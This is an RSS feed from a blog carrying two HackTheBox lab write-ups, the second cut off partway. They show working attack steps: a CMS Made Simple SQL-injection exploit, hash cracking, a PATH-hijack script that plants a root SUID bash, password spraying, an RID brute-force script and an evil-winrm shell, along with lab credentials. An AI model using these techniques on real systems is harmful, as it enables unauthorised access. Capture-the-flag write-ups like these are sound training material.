<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Ef&#39;s log</title>
    <link>https://fahmifj.github.io/</link>
    <description>Recent content on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Fri, 06 Aug 2021 00:04:21 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Writeup</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-writeup/</link>
      <pubDate>Fri, 06 Aug 2021 00:04:21 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-writeup/</guid>
      <description>Writeup is another box I completed during the HackTheBox easy month. It starts off by exploiting a CMS that is vulnerable to SQL injection to retrieve credentials from the database. These credentials allow me to SSH login into the machine. Internal enumeration of the machine discovers a binary that gets executed by root user if someone logs in via SSH. This binary is called without its absolute path. With a write access on a PATH directory, I could hijack the binary to gain myself a root shell.</description>
      <content:encoded><![CDATA[<p>Writeup is another box I completed during the HackTheBox easy month. It starts off by exploiting a CMS that is vulnerable to SQL injection to retrieve credentials from the database. These credentials allow me to SSH login into the machine. Internal enumeration of the machine discovers a binary that gets executed by root user if someone logs in via SSH. This binary is called without its absolute path. With a write access on a PATH directory, I could hijack the binary to gain myself a root shell.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Exploiting CMS Made Simple</li>
<li>Path Hijack</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Nmap</li>
<li><a href="https://www.exploit-db.com/exploits/46635">CMS Made Simple Exploit PoC</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full tcp scan using <code>nmap</code> discovers two open ports: SSH on port 22 and an Apache web server on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «writeup» «10.10.14.83» 
$ nmap -p- -oA nmap/10-tcp-allport-writeup 10.10.10.138                 
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-11 15:32 EDT
Nmap scan report <span class="k">for</span> 10.10.10.138
Host is up <span class="o">(</span>0.052s latency<span class="o">)</span>.
Not shown: <span class="m">65533</span> filtered ports
PORT   STATE SERVICE
22/tcp  ssh
80/tcp open  http

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 109.90 seconds
→ kali@kali «writeup» «10.10.14.83» 
$ nmap -p22,80 -sC -sV -oA nmap/10-tcp-allport-script-writeup 10.10.10.138
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-11 15:50 EDT
Nmap scan report <span class="k">for</span> 10.10.10.138
Host is up <span class="o">(</span>0.10s latency<span class="o">)</span>.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey: 
<span class="p">|</span>   <span class="m">2048</span> dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
<span class="p">|</span> http-robots.txt: <span class="m">1</span> disallowed entry 
<span class="p">|</span>_/writeup/
<span class="p">|</span>_http-title: Nothing here yet.
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 11.02 seconds
</code></pre></div><p><code>nmap</code> also identified a disallowed directory  called  <code>/writeup/</code>  on the hosted site from a <code>robot.txt</code> file.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Heading to the website, I find an announcement which states that the server has DoS protection. So I will avoid any form of brute-force attack.</p>
<p><img class="img-container" src="imgs/image-20210712044500370.png" alt="image-20210712044500370"  />
</p>
<p>I&rsquo;ve added the domain name <code>writeup.htb</code> from the email listed above to my <code>/etc/hosts</code>. Poking the site again with domain name doesn&rsquo;t show any different.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «writeup» «10.10.14.83» 
$ curl -s http://writeup.htb/ <span class="p">|</span> wc -c
<span class="m">3032</span>
→ kali@kali «writeup» «10.10.14.83» 
$ curl -s http://10.10.10.138/ <span class="p">|</span> wc -c
<span class="m">3032</span>
</code></pre></div><h4 id="writeup">/writeup/</h4>
<p>Poking the <code>/writeup/</code> directory with hostname only shows 5 bytes different, and that&rsquo;s probably because the URL in the source changed from number to character.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «writeup» «10.10.14.83» 
$ curl -s http://10.10.10.138/writeup/ <span class="p">|</span> wc -c
<span class="m">1556</span>
→ kali@kali «writeup» «10.10.14.83» 
$ curl -s http://writeup.htb/writeup/ <span class="p">|</span> wc -c 
<span class="m">1551</span>
</code></pre></div><p>The site looks like still WIP.</p>
<p><img class="img-container" src="./imgs/image-20210712064012743.png" alt="image-20210712064012743"  />
</p>
<p>On the page source, it shows that the site is generated using <a href="http://www.cmsmadesimple.org/">CMS Made Simple</a>.</p>
<p><img class="img-container" src="./imgs/image-20210712071448079.png" alt="image-20210712071448079"  />
</p>
<p>I found that the index page itself has one parameter called <code>page</code>. Judging from the <code>.php</code> extension and the parameter, the site might be interacting with a database.</p>
<ul>
<li>http://10.10.10.138/writeup/index.php?page=writeup</li>
</ul>
<h3 id="finding-vulnerabilities">Finding Vulnerabilities</h3>
<p>Since this is an easy box, I started to look for an exploit on Google. Using the box release date (08 Jun 2019) as a hint, I found some potential exploits.</p>
<p><img class="img-container" src="./imgs/image-20210712071635128.png" alt="image-20210712071635128"  />
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-jkr">Shell as jkr</h3>
<h4 id="unauthenticated-sql-injection-on-cms-made-simple--229">Unauthenticated SQL Injection on CMS Made Simple &lt;= 2.2.9</h4>
<p>The SQL injection vulnerability is classified as CVE-2019-9053, and it doesn&rsquo;t require authentication. I will be using <a href="https://www.exploit-db.com/exploits/46635">this poc</a> to exploit this vuln.</p>
<p>The exploit found one password hash for user <code>jkr</code>.</p>
<p><img class="img-container" src="./imgs/image-20210712073023879.png" alt=""  />
</p>
<h4 id="password-cracking">Password Cracking</h4>
<p>The password can be cracked using <code>hashcat</code>. It recovered to <code>raykayjay9</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">./hashcat.exe -m <span class="m">20</span> <span class="s2">&#34;62def4866937f08cc13bab43bb14e6f7:5a599ef579066807&#34;</span> ../../rockyou.txt -O

62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9

Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5<span class="o">(</span><span class="nv">$salt</span>.<span class="nv">$pass</span><span class="o">)</span>
</code></pre></div><h4 id="ssh---jkr">SSH - jkr</h4>
<p>The password work on SSH for user <code>jkr</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.83» 
$ ssh jkr@10.10.10.138   
jkr@10.10.10.138<span class="err">&#39;</span>s password: 
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

...<span class="o">[</span>SNIP<span class="o">]</span>...

Last login: Sun Jul <span class="m">11</span> 08:31:07 <span class="m">2021</span> from 10.10.14.28
jkr@writeup:~$ id <span class="o">&amp;&amp;</span> ip a
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>jkr<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>jkr<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>jkr<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,50<span class="o">(</span>staff<span class="o">)</span>,103<span class="o">(</span>netdev<span class="o">)</span>
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="m">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class="m">1</span>
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="m">1500</span> qdisc pfifo_fast state UP group default qlen <span class="m">1000</span>
    link/ether 00:50:56:b9:2d:3a brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.138/24 brd 10.10.10.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feb9:2d3a/64 scope link 
       valid_lft forever preferred_lft forever
</code></pre></div><p>The user flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jkr@writeup:~$ cat user.txt
d4e49...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>During process inspection, I noticed that the root user executed the following command, which occurs every time <code>jkr</code> logs in.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">sh -c /usr/bin/env -i <span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new 
</code></pre></div><p><img class="img-container" src="imgs/image-20210712081613422.png" alt="image-20210712081613422"  />
</p>
<p>According to the <a href="https://man7.org/linux/man-pages/man1/env.1.html">man page</a> of <code>env</code>, the <code>-i</code> flag means the execution starts with an empty environment.</p>
<p><img class="img-container" src="imgs/image-20210805222545108.png" alt="image-20210805222545108"  />
</p>
<p>User <code>jkr</code> is a member of the <code>staff</code> group [<a href="https://raspberrypi.stackexchange.com/questions/67670/what-is-the-purpose-of-group-staff">source</a>], so it is possible to hijack the <code>run-parts</code> binary since I have write access on <code>/usr/local/</code>.</p>
<p><img class="img-container" src="imgs/image-20210805231326745.png" alt="image-20210805231326745"  />
</p>
<p>If it was too wordy, see the example below.</p>
<p><img class="img-container" src="imgs/image-20210806012111454.png" alt="image-20210806012111454"  />
</p>
<p>The executables under  <code>/usr/local/bin/</code> overrides the ones under <code>/bin</code>.</p>
<h4 id="path-hijack">Path Hijack</h4>
<p>I will create a script that copies the <code>bash</code> to /<code>tmp/</code> under <code>/usr/local/bin/</code> and I will name it as <code>run-script</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jkr@writeup:/tmp$ <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/sh\ncp /bin/bash /tmp/iamf &amp;&amp; chmod 4755 /tmp/iamf&#39;</span> &gt; /usr/local/bin/run-parts
jkr@writeup:/tmp$ chmod +x /usr/local/bin/run-parts
</code></pre></div><p>Then, I will I start another SSH login to trigger the script.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.83» 
$ ssh jkr@10.10.10.138
jkr@10.10.10.138<span class="err">&#39;</span>s password: 
</code></pre></div><p>And my copy of bash is now available in <code>/tmp/</code>. Since it has SUID of root, I can become root by executing the bash using <code>-p</code> flag.</p>
<p><img class="img-container" src="imgs/image-20210712082934311.png" alt="image-20210712082934311"  />
</p>
<hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://www.exploit-db.com/exploits/46635">https://www.exploit-db.com/exploits/46635</a></li>
<li><a href="https://raspberrypi.stackexchange.com/questions/67670/what-is-the-purpose-of-group-staff">https://raspberrypi.stackexchange.com/questions/67670/what-is-the-purpose-of-group-staff</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Heist</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-heist/</link>
      <pubDate>Wed, 28 Jul 2021 04:05:19 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-heist/</guid>
      <description>Heist features a Help Desk-like system that allows a visitor to login as guest. This allows me to obtain several usernames and passwords that can be recovered from a Cisco configuration file which is attached to an ongoing issue. Valid credentials obtained by performing a password spray attack. With these credentials, a RID brute-force attack is performed in order to obtain more usernames. A second attempt password spray with updated wordlist gains me a foothold in the system.</description>
      <content:encoded><![CDATA[<p>Heist features a Help Desk-like system that allows a visitor to login as guest. This allows me to obtain several usernames and passwords that can be recovered from a Cisco configuration file which is attached to an ongoing issue. Valid credentials obtained by performing a password spray attack. With these credentials, a RID brute-force attack is performed in order to obtain more usernames. A second attempt password spray with updated wordlist gains me a foothold in the system. There are multiple instances of Firefox running which can be dumped to obtain the password for administrator account.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Password spray attack</li>
<li>Username enumeration via RPC using RID brute-force.</li>
<li>Process dump</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Nmap</li>
<li>CrackMapExec</li>
<li>Hashcat</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan using <code>nmap</code> discovers five open ports: an IIS Web server on port 80, MS-RPC on port 135 and port 49669, SMB on port 445, WinRM on port 5985.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ nmap -p- -oA nmap/10-tcp-allport-heist 10.10.10.149
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-11 21:43 EDT
Nmap scan report <span class="k">for</span> 10.10.10.149
Host is up <span class="o">(</span>0.069s latency<span class="o">)</span>.
Not shown: <span class="m">65530</span> filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
49669/tcp open  unknown

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 148.82 seconds
→ kali@kali «heist» «10.10.14.83» 
$ nmap -p80,135,445,5985,49669 -sC -sV -oA nmap/10-tcp-allport-script-heist 10.10.10.149
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-11 21:46 EDT
Nmap scan report <span class="k">for</span> 10.10.10.149
Host is up <span class="o">(</span>0.061s latency<span class="o">)</span>.

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
<span class="p">|</span> http-cookie-flags: 
<span class="p">|</span>   /: 
<span class="p">|</span>     PHPSESSID: 
<span class="p">|</span>_      httponly flag not <span class="nb">set</span>
<span class="p">|</span> http-methods: 
<span class="p">|</span>_  Potentially risky methods: TRACE
<span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
<span class="p">|</span> http-title: Support Login Page
<span class="p">|</span>_Requested resource was login.php
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="p">|</span>_http-title: Not Found
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="p">|</span>_clock-skew: 2m52s
<span class="p">|</span> smb2-security-mode: 
<span class="p">|</span>   2.02: 
<span class="p">|</span>_    Message signing enabled but not required
<span class="p">|</span> smb2-time: 
<span class="p">|</span>   date: 2021-07-12T01:50:42
<span class="p">|</span>_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 99.94 seconds
</code></pre></div><p>I probably won&rsquo;t touch MS-RPC on port 49669, but the one on port 135 is worth checking to detect PrintNightmare (which I already did in <a href="https://fahmifj.github.io/blog/play-with-printnightmare/">this post</a>).</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Without credentials, I can&rsquo;t do much on SMB.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ smbclient -N -L //10.10.10.149
session setup failed: NT_STATUS_ACCESS_DENIED
</code></pre></div><h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting the website on port 80 presented with a login page.</p>
<p><img class="img-container" src="imgs/image-20210712085020304.png" alt="image-20210712085020304"  />
</p>
<p>No register button was found here, so I clicked the guest login and it brought me to the following page.</p>
<p><img class="img-container" src="imgs/image-20210712085409456.png" alt="image-20210712085409456"  />
</p>
<p>From the chat above, user Hazard attached his cisco configuration in a text file, and this config file contains several credentials.</p>
<p><img class="img-container" src="imgs/image-20210712085452329.png" alt="image-20210712085452329"  />
</p>
<p>I know this is not my business, but looks like this part messed up his router 😅.</p>
<p><img class="img-container" src="imgs/image-20210726174927930.png" alt="image-20210726174927930"  />
</p>
<p>So anyway, I will grab these credentials and also I will note that hazard asked the admin to create an account for accessing the files, which probably the SMB share.</p>
<h3 id="password-crack">Password Crack</h3>
<p>The first password can be recovered with <code>hashcat</code> (identified as md5crypt).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ ./hashcat.exe -m <span class="m">500</span> hashes/heist-cisco.hash ../../rockyou.txt -O

...<span class="o">[</span>SNIP<span class="o">]</span>...

<span class="nv">$1$pdQG$o8nrSzsGXeaduXrjlvKc91</span>:stealth1agent

Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5crypt, MD5 <span class="o">(</span>Unix<span class="o">)</span>, Cisco-IOS <span class="nv">$1</span>$ <span class="o">(</span>MD5<span class="o">)</span>
Hash.Target......: <span class="nv">$1$pdQG$o8nrSzsGXeaduXrjlvKc91</span>
Time.Started.....: Mon Jul <span class="m">12</span> 08:58:28 <span class="m">2021</span> <span class="o">(</span><span class="m">2</span> secs<span class="o">)</span>
Time.Estimated...: Mon Jul <span class="m">12</span> 08:58:30 <span class="m">2021</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
Guess.Base.......: File <span class="o">(</span>../../rockyou.txt<span class="o">)</span>

...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>The rest of the passwords are encrypted with cisco type 7 encryption. These passwords can be decrypted using <a href="https://davidbombal.com/cisco-type-7-password-decryption/">this site</a> .</p>
<p><img class="img-container" src="imgs/image-20210712090727149.png" alt="image-20210712090727149"  />
</p>
<p><img class="img-container" src="imgs/image-20210712090628350.png" alt="image-20210712090628350"  />
</p>
<p>Now I have one password and two set of credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">?:$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent
rout3r:0242114B0E143F015F5D1E161713:$uperP@ssword
admin:02375012182C1A1D751618034F36415408:Q4)sJu\Y8qz*A3?d
</code></pre></div><h3 id="access-as-hazard">Access as Hazard</h3>
<h4 id="password-spray">Password Spray</h4>
<p>With user <code>hazard</code> included, I have three usernames and three passwords. I will use them to perform a password spray attack on SMB using <code>crackmapexec</code>. The results reveals that the password <code>stealth1agent</code>  works for user <code>hazard</code>, but it doesn&rsquo;t show &ldquo;Pwn3d!&rdquo; message, this means I have no access to WinRM.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ crackmapexec smb 10.10.10.149 -u usernames.list -p passwords.list
SMB         10.10.10.149    <span class="m">445</span>    SUPPORTDESK      <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.149    <span class="m">445</span>    SUPPORTDESK      <span class="o">[</span>+<span class="o">]</span> SupportDesk<span class="se">\h</span>azard:stealth1agent 
</code></pre></div><p>Another spray shows that user <code>hazard</code> can login into RPC servic as well.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ ./exploits/rpcspray.sh usernames.list passwords.list 10.10.10.149
<span class="o">[</span>*<span class="o">]</span> Trying user@password: hazard@stealth1agent 
Account Name: Hazard, Authority Name: SUPPORTDESK
<span class="o">[</span>*<span class="o">]</span> Trying user@password: hazard@<span class="nv">$uperP</span>@ssword 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
<span class="o">[</span>*<span class="o">]</span> Trying user@password: hazard@Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz*A3?d 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
<span class="o">[</span>*<span class="o">]</span> Trying user@password: admin@stealth1agent 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
<span class="o">[</span>*<span class="o">]</span> Trying user@password: admin@<span class="nv">$uperP</span>@ssword 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
<span class="o">[</span>*<span class="o">]</span> Trying user@password: admin@Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz*A3?d 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
</code></pre></div><h4 id="user-enumeration-via-rpc">User Enumeration via RPC</h4>
<p>Since the share doesn&rsquo;t contain anything juicy, the other things I can do with user hazard is enumeration on RPC.</p>
<p>Within <code>rpcclient</code> shell, <code>enumdomusers</code> is typically used to enumerate domain users, but it doesn&rsquo;t work here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ rpcclient -U <span class="s1">&#39;hazard%stealth1agent&#39;</span> 10.10.10.149                   
rpcclient $&gt; srvinfo
        10.10.10.149   Wk Sv NT SNT         
        platform_id     :       <span class="m">500</span>
        os version      :       10.0
        server <span class="nb">type</span>     :       0x9003
rpcclient $&gt; enumdomusers
result was NT_STATUS_CONNECTION_DISCONNECTED
</code></pre></div><p>Based on the result, the problem here was not the user&rsquo;s permissions. But, fortunately, the  <code>lookupnames</code>  command can be used to retrieve user&rsquo;s <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows">SID</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; lookupnames hazard
hazard S-1-5-21-4254423774-1266059056-3197185112-1008 <span class="o">(</span>User: 1<span class="o">)</span>
</code></pre></div><p>Reverse lookups (SID to username) also works here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008
S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK<span class="se">\H</span>azard <span class="o">(</span>1<span class="o">)</span>
</code></pre></div><p>In Windows system, excluding RID, this value <code>S-1-5-21-4254423774-1266059056-3197185112-RID</code>  is likely to be unique and is fixed for each computer domain. A normal user RID usually starts from 1000, and with this, I can enumerate the available users by incrementing the number.</p>
<p>The enumeration can be scripted using bash, and I&rsquo;ve created one to enumerate the first 20 users.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
</span><span class="cp"></span>
<span class="nv">sid</span><span class="o">=</span><span class="s2">&#34;S-1-5-21-4254423774-1266059056-3197185112&#34;</span>

<span class="k">for</span> i in <span class="sb">`</span>seq <span class="m">1000</span> 1020<span class="sb">`</span><span class="p">;</span> <span class="k">do</span>
 rpcclient -U <span class="s2">&#34;hazard%stealth1agent&#34;</span> -c <span class="s2">&#34;lookupsids </span><span class="nv">$sid</span><span class="s2">-</span><span class="nv">$i</span><span class="s2">;quit&#34;</span> 10.10.10.149 <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f2
<span class="k">done</span>
</code></pre></div><blockquote>
<p>Note: <code>enumdomusers</code> RID returns in hexadecimal, for example a builtin administrator account has a default RID of 500 in decimal, so in hex it&rsquo;s 0x1F4.</p>
</blockquote>
<p>I saved the script as <code>rpc-userenum.sh</code> and ran it, and it returned with three valid usernames. I will add these usernames to my username wordlist.</p>
<p><img class="img-container" src="imgs/image-20210712105959998-1627299069625.png" alt="image-20210712105959998"  />
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-chase">Shell as Chase</h3>
<h4 id="password-spray-1">Password Spray</h4>
<p>With updated username wordlist, I could do another password spray attack on WinRM. The results shows a &ldquo;Pwn3d!&rdquo; message for user <code>chase</code> with a password of <code>Q4)sJu\Y8qz*A3?d </code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ crackmapexec winrm 10.10.10.149 -u usernames.list -p passwords.list 
WINRM       10.10.10.149    <span class="m">5985</span>   NONE             <span class="o">[</span>*<span class="o">]</span> None <span class="o">(</span>name:10.10.10.149<span class="o">)</span> <span class="o">(</span>domain:None<span class="o">)</span>
WINRM       10.10.10.149    <span class="m">5985</span>   NONE             <span class="o">[</span>*<span class="o">]</span> http://10.10.10.149:5985/wsman
...<span class="o">[</span>SNIP<span class="o">]</span>...
WINRM       10.10.10.149    <span class="m">5985</span>   NONE             <span class="o">[</span>+<span class="o">]</span> None<span class="se">\c</span>hase:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz*A3?d <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div><h4 id="winrm---chase">WinRM - Chase</h4>
<p>I can login into the system with <code>chase</code>&rsquo;s credentials using <code>evil-winrm</code>. The user flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ evil-winrm -i 10.10.10.149 -u <span class="s1">&#39;chase&#39;</span> -p <span class="s1">&#39;Q4)sJu\Y8qz*A3?d&#39;</span>

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>ocuments&gt; whoami<span class="p">;</span> hostname<span class="p">;</span> ipconfig<span class="p">;</span> <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
supportdesk<span class="se">\c</span>hase
SupportDesk

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : dead:beef::5d4b:5294:9dc3:565c
   Link-local IPv6 Address . . . . . : fe80::5d4b:5294:9dc3:565c%15
   IPv4 Address. . . . . . . . . . . : 10.10.10.149
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
                                       10.10.10.2
a127d...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h4 id="tools-share">Tools Share</h4>
<p>Before going further, I would like to host my essential tools using <code>impacket-smbserver</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ impacket-smbserver ef ~/tools -smb2support -username ef -password ef
Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation

<span class="o">[</span>*<span class="o">]</span> Config file parsed
<span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span>*<span class="o">]</span> Config file parsed
<span class="o">[</span>*<span class="o">]</span> Config file parsed
<span class="o">[</span>*<span class="o">]</span> Config file parsed
<span class="o">[</span>*<span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.149,49708<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\e</span>f,SUPPORTDESK<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> User SUPPORTDESK<span class="se">\e</span>f authenticated successfully
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>The share then used on Heist. With this, I could use any of my tools directly from the share.</p>
